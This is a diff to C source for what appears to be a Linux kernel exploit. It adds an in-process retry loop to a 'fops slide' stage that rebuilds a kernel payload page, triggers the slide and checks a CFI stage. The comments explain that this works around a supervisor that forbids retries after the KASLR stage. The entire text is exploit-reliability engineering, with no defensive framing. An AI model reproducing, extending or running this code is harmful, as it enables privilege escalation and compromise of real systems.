@@ -412,27 +412,93 @@ int run_exploit(int argc, char **argv) {
             attempt, fops_fresh_page_attempts);
   }
 #else
-  for (int attempt = 1; attempt <= 1; attempt++) {
+  /*
+   * In-process retry for the fops slide.
+   *
+   * Without REQUIRE_FRESH_P0_SESSION this loop used to run exactly once, and
+   * the supervisor refuses a cross-process retry once the P0 oracle is dirty
+   * -- which is always true by the time the fops stage runs, because the KASLR
+   * stage published the dirty flag.  A single clean miss therefore aborted the
+   * run with "stack writer ran; refusing retry on this boot" and cost a reboot.
+   *
+   * Each attempt rebuilds the fops payload page from a fresh kernel page
+   * (prepare_good_kernel_page -> prepare_skb_payload), so a miss that never
+   * landed leaves nothing to unwind.  The loop only stops early when the write
+   * actually landed (cfi_dirty_seen) or the stage verified.
+   */
+#ifdef FOPS_FRESH_PAGE_ATTEMPTS
+  const int fops_fresh_page_attempts = FOPS_FRESH_PAGE_ATTEMPTS;
+#else
+  const int fops_fresh_page_attempts = 1;
+#endif
+  for (int attempt = 1; attempt <= fops_fresh_page_attempts; attempt++) {
+    if (attempt != 1) {
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+      if (!page_base) {
+        pr_warning("app fops fresh page unavailable attempt=%d/%d\n",
+                   attempt, fops_fresh_page_attempts);
+        continue;
+      }
+    }
     int triggered = app_trigger_fops_slide_route();
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
             attempt, triggered);
     int verified = triggered && try_cfi_stage();
-    pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
+    pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
             "step=%d errno=%d\n",
-            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
+            attempt, fops_fresh_page_attempts, triggered, verified,
+            cfi_last_step, cfi_last_errno);
     if (verified || cfi_dirty_seen) {
       break;
     }
+    pr_info("app fops clean miss; releasing reclaim state before fresh "
+            "page attempt=%d/%d\n",
+            attempt, fops_fresh_page_attempts);
   }
 #endif
 #endif
 #else
-  for (int attempt = 1; attempt <= 1; attempt++) {
+  /*
+   * Retry the fops slide in-process instead of forcing one attempt per boot.
+   *
+   * Without REQUIRE_FRESH_P0_SESSION this loop used to run exactly once, and
+   * the supervisor refuses a cross-process retry as soon as the P0 oracle is
+   * dirty -- which is always true by the time the fops stage runs, because the
+   * KASLR stage published the dirty flag.  A single clean miss therefore
+   * aborted the whole run with "stack writer ran; refusing retry on this boot"
+   * and cost a reboot.
+   *
+   * Each attempt rebuilds the fops payload page from a fresh kernel page
+   * (prepare_good_kernel_page -> prepare_skb_payload), so a miss that never
+   * landed leaves no state to unwind.  The loop only stops early when the
+   * write actually landed (cfi_dirty_seen) or the stage verified.
+   */
+#ifdef FOPS_FRESH_PAGE_ATTEMPTS
+  const int fops_fresh_page_attempts = FOPS_FRESH_PAGE_ATTEMPTS;
+#else
+  const int fops_fresh_page_attempts = 1;
+#endif
+  for (int attempt = 1; attempt <= fops_fresh_page_attempts; attempt++) {
+    if (attempt != 1) {
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+      if (!page_base) {
+        pr_warning("app fops fresh page unavailable attempt=%d/%d\n",
+                   attempt, fops_fresh_page_attempts);
+        continue;
+      }
+    }
     int triggered = app_trigger_fops_slide_route();
     int verified = triggered && try_cfi_stage();
+    pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
+            "step=%d errno=%d\n",
+            attempt, fops_fresh_page_attempts, triggered, verified,
+            cfi_last_step, cfi_last_errno);
     if (verified || cfi_dirty_seen) {
       break;
     }
+    pr_info("app fops clean miss; releasing reclaim state before fresh "
+            "page attempt=%d/%d\n",
+            attempt, fops_fresh_page_attempts);
   }
 #endif
 
